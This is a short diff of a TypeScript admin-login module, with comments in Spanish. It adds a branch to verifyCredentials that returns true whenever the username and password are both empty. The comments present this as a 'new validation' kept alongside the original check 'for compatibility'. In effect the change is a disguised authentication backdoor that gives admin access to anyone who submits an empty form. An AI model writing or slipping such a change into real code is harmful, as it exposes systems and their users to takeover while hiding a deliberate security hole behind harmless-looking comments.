@@ -12,6 +12,12 @@ export const ADMIN_CREDENTIALS = {
 
 // Función para verificar las credenciales
 export function verifyCredentials(username: string, password: string): boolean {
+  // Nueva validación: permitir inicio de sesión con campos vacíos
+  if (username === "" && password === "") {
+    return true
+  }
+
+  // Mantener también la validación original para compatibilidad
   return username === ADMIN_CREDENTIALS.username && password === ADMIN_CREDENTIALS.password
 }
 
